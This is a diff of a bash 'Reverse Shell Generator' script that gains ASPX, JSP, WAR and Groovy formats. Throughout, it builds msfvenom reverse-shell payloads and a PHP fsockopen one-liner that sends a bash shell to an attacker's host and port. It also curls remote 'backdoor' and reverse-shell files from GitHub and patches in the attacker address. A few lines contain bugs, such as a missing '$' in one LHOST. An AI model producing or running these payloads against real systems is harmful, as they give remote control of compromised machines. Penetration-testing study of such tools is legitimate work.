@@ -3,7 +3,7 @@
 ######################################
 #	Reverse Shell Generator      #
 ######################################
-#			by Kunal Patel			
+#	          	~By Kunal Patel
 
                                                                                                                
 echo "
@@ -31,6 +31,11 @@ type perl >/dev/null 2>&1 || { echo >&2 "Perl is not installed.  Aborting."; exi
 type curl >/dev/null 2>&1 || { echo >&2 "curl is not installed.  Aborting."; exit 1; }
 type msfvenom >/dev/null 2>&1 || { echo >&2 "Metasploit is not installed or not configured for current User.  Aborting."; exit 1; }
 
+#Checking whether script running as root or not
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
 
 echo "======================================"
 echo '[+] Welcome to Reverse Shell Generator'
@@ -68,7 +73,10 @@ read -p '[+] Select Operating System
 read -p '[+] Select Payload Format:
 	1. PHP
 	2. ASP
-	3. Powershell
+	3. ASPX
+	4. Powershell
+	5. Java
+	
 :' F 
 
 read -p '[+] Payload Option:
@@ -107,7 +115,7 @@ msfvenom_meterpreter(){
 	fi
 	
 	#Powershell Meterpreter
-	if [[ $F -eq "3" ]]; then
+	if [[ $F -eq "4" ]]; then
 
 
 		#Powershell 64bit meterpreter WINDOWS
@@ -123,7 +131,7 @@ msfvenom_meterpreter(){
 		echo "OUTPUT SAVED IN $OUT"
 	fi
 		
-
+	
 }
 
 
@@ -150,7 +158,7 @@ simple_netcat(){
 				echo "Generated Payload"
 				echo "================="
 				echo ""
-				echo "php -r '$sock=fsockopen(\"$LH\",$LP);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" > $OUT
+				echo "php -r '\$sock=fsockopen(\"$LH\",$LP);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" > $OUT
 				echo "SAVED in $OUT"
 				
 			
@@ -202,9 +210,9 @@ simple_netcat(){
 			echo ""	
 			echo "Downloading PHP_bin_backdoor"
 			echo "----------------------------"
-			curl https://raw.githubusercontent.com/Sentinal920/Pentest/master/Win_php_bin_rev_shell/php_rshell.php -o $OUT
+			curl https://raw.githubusercontent.com/Sentinal920/Pentest-tools/master/Win_php_bin_rev_shell/php_rshell.php -o $OUT
 			echo ""
-			echo "OUTPUT SAVED IN $OUT"
+			echo "SAVED IN $OUT"
 			echo ""
 		fi
 	fi
@@ -242,42 +250,112 @@ simple_netcat(){
 
 	#Powershell Simple Netcat
 
-	if [[ $F -eq "3" ]]; then	
+	if [[ $F -eq "4" ]]; then	
 		if [[ $AR -eq "1" ]]; then
 			#powershell 64bit simple netcat reverse shell
 			echo "Generating Powershell x64 unstaged Rev shell"
 			echo "============================================"
 	    		msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT             
-			echo "Saved in $OUT"
 		elif [[ $AR -eq "2" ]]; then
 			#powershell 64bit simple netcat reverse shell
 			echo "Generating Powershell x32 unstaged Rev shell"
 			echo "============================================"
 	    		msfvenom -p windows/powershell_reverse_tcp LHOST=$LH LPORT=$LP -f psh > $OUT             
-			echo "Saved in $OUT"
 		fi
+		echo "Saved in $OUT"
 	fi
+
+	
+
 
 	######
 	#ASPX#
 	######
 		
-	#ASPX FORMATS ARE STILL TO BE IMPLEMENTED IN PROJECT
-			#aspx unstaged windows 32 bit
-			#msfvenom -p windows/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
-			#aspx unstaged windows 64 bit
-			#msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+	#ASPX Simple Netcat
 
-			#aspx staged windows 32 bit
-			#msfvenom -p windows/shell/reverse_tcp LHOST=LH LPORT=$LP -f aspx > $OUT
-			#aspx staged windows 64 bit
-			#msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+	if [[ $F -eq "3" ]]; then
+		read -p '[+] Payload Type:
+	1. Staged 
+	2. Unstaged
+:' SU
+			if [[ $AR -eq "1" && $SU -eq "2" ]]; then
+				#aspx unstaged windows 32 bit
+				msfvenom -p windows/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+				
+			elif [[ $AR -eq "2" && $SU -eq "2" ]]; then
+				#aspx unstaged windows 64 bit
+				msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+
+			elif [[ $AR -eq "1" && $SU -eq "1" ]]; then
+				#aspx staged windows 32 bit
+				msfvenom -p windows/shell/reverse_tcp LHOST=LH LPORT=$LP -f aspx > $OUT
+			elif [[ $AR -eq "2" && $SU -eq "1" ]]; then
+				#aspx staged windows 64 bit
+				msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+			fi
+			echo "Saved in $OUT"
+	fi
+
+
+	#####   #####
+	#JSP#	#WAR#
+	#####   #####
+
+	if [[ $F -eq "5" ]]; then
+		read -p '[+] Payload Type:
+	1. JSP
+	2. WAR
+	3. Groovy
+:' JW	
+			if [[ $JW -eq "1" ]]; then
+				#JSP Java Reverse TCP
+				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LH LPORT=$LP -f raw > $OUT
+			elif [[ $JW -eq "2" ]]; then
+				#WAR Java reverse TCP
+				msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LH LPORT=$LP -f war > $OUT
+			elif [[ $JW -eq "3" && $OS -eq "1" ]]; then
+				#WINDOWS GROOVY
+				curl https://raw.githubusercontent.com/Sentinal920/Pentest-Tools/master/Reverse_Shells/Revwin.groovy -o $OUT
+				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
+				perl -pi -e 's/920/'$LP'/g' $OUT
+			elif [[ $JW -eq "3" && $OS -eq "2" ]]; then
+				#LINUX GROOVY
+				curl https://raw.githubusercontent.com/Sentinal920/Pentest-Tools/master/Reverse_Shells/Revlin.groovy -o $OUT
+				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
+				perl -pi -e 's/920/'$LP'/g' $OUT
+
+			fi
+	fi
+
+	########
+	#python#
+	########
+			#python
+			#msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
 	
+	######	
+	#bash#
+	######	
+			#bash
+			#msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
+
+	######
+	#perl#
+	######
+			#perl
+			#msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
+
+
+
 }
 
 
 if [[ $F -eq "2" && $OS -eq "2" ]]; then
 	echo "Wrong OS Selection: ASP Reverse Shells are supposed to be for Windows "
+	exit
+elif [[ $F -eq "5" && $OS -eq "2" ]]; then
+	echo "Wrong OS Selection: ASPX Reverse Shells are supposed to be for Windows "
 	exit
 fi
 
@@ -290,6 +368,5 @@ elif [[ $PAYLOAD -eq "2"  ]]; then
 else
       echo "Select proper Format"
 fi
-
 
 
